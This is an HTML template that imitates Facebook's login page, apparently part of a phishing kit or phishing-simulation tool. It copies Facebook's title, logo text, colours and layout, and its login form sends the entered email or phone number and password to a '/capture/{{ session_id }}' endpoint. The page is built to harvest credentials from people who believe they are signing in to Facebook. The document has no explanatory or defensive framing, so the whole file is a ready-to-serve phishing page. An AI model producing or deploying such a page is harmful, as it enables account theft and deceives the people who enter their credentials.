<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook - log in or sign up</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
    font-family:Helvetica,Arial,sans-serif;
    background:#f0f2f5;
    display:flex;
    justify-content:center;
    align-items:center;
    min-height:100vh
}
#content{display:flex;max-width:980px;width:100%;padding:20px;gap:40px;align-items:center;flex-wrap:wrap;justify-content:center}
.left{flex:1;min-width:320px;padding-right:32px}
.left h1{color:#1877f2;font-size:56px;font-weight:700;letter-spacing:-1.6px;margin-bottom:10px}
.left p{font-size:28px;color:#1c1e21;line-height:1.2}
.right{min-width:320px}
.card{
    background:#fff;
    border-radius:8px;
    box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);
    padding:16px;
    width:100%;
    max-width:396px
}
.card input{
    width:100%;
    padding:14px 16px;
    font-size:17px;
    border:1px solid #dddfe2;
    border-radius:6px;
    margin-bottom:12px;
    outline:none;
    color:#1d2129
}
.card input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
.card button[type="submit"]{
    width:100%;
    padding:12px;
    background:#1877f2;
    color:#fff;
    font-size:20px;
    font-weight:700;
    border:none;
    border-radius:6px;
    cursor:pointer
}
.card button[type="submit"]:hover{background:#166fe5}
.card .forgot{text-align:center;margin:16px 0}
.card .forgot a{color:#1877f2;font-size:14px;text-decoration:none}
.card hr{border:none;border-bottom:1px solid #dadde1;margin:16px 0}
.card .create{text-align:center}
.card .create a{
    display:inline-block;
    background:#42b72a;
    color:#fff;
    font-size:17px;
    font-weight:700;
    padding:12px 16px;
    border-radius:6px;
    text-decoration:none
}
.card .create a:hover{background:#36a420}
.foot{text-align:center;margin-top:20px;font-size:14px;color:#1c1e21}
.foot a{color:#1c1e21;font-weight:600;text-decoration:none}
</style>
</head>
<body>
<div id="content">
    <div class="left">
        <h1>facebook</h1>
        <p>Facebook helps you connect and share with the people in your life.</p>
    </div>
    <div class="right">
        <div class="card">
            <form action="/capture/{{ session_id }}" method="POST">
                <input type="text" name="username" placeholder="Email address or phone number" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
            <div class="forgot"><a href="#">Forgotten account?</a></div>
            <hr>
            <div class="create"><a href="#">Create New Account</a></div>
        </div>
        <div class="foot"><a href="#">Create a Page</a> for a celebrity, brand or business.</div>
    </div>
</div>
</body>
</html>
